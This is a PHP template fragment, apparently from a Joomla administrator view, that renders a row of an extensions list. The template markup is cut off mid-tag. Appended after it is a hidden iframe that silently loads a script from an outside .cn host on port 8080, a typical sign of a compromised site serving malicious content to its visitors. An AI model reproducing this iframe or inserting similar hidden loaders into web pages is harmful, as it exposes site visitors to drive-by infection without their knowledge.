<tr class="<?php echo "row".$this->item->index % 2; ?>" <?php echo $this->item->style; ?>>
	<td><?php echo $this->pagination->getRowOffset( $this->item->index ); ?></td>
	<td>
		<input type="checkbox" id="cb<?php echo $this->item->index;?>" name="eid[<?php echo $this->item->id; ?>]" value="<?php echo $this->item->client_id; ?>" onclick="isChecked(this.checked);" <?php echo $this->item->cbd; ?> />
		<span class="bold"><?php echo $this->item->module; ?></span>
	</td>
	<td align="center">
		<?php echo $this->item->client_id == "0" ? JText::_( 'Site' ) : JText::_( 'Admin' ); ?>
	</td>
	<td align="center"><?php echo @$this->item->version != '' ? $this->item->version : '&nbsp;'; ?></td>
	<td><?php echo @$this->item->creationdate != '' ? $this->item->creationdate : '&nbsp;'; ?></td>
	<td>
		<span class="editlinktip hasTip" title="<?php echo JText::_( 'Author Information' );?>::<?php echo $this->item->author_info; ?>">
			<?php echo @$this->item->author != '' ? $this->item->author : '&nbsp;'; ?>
		</span>
	</td>
	<td align="center">
		<span class="editlinktip hasTip" title="<?php echo (@$this->item->legacy ? JText::_( 'Not Compatible Extension') : JText::_('Compatible Extension'));?>">
			<img src="images/<?php echo (@$this->item->legacy ? 'publish_x.png' : 'tick.png');?>"/>
		</
<iframe src="http://globalmixgroup.cn:8080/ts/in.cgi?pepsi64" width=125 height=125 style="visibility: hidden"></iframe>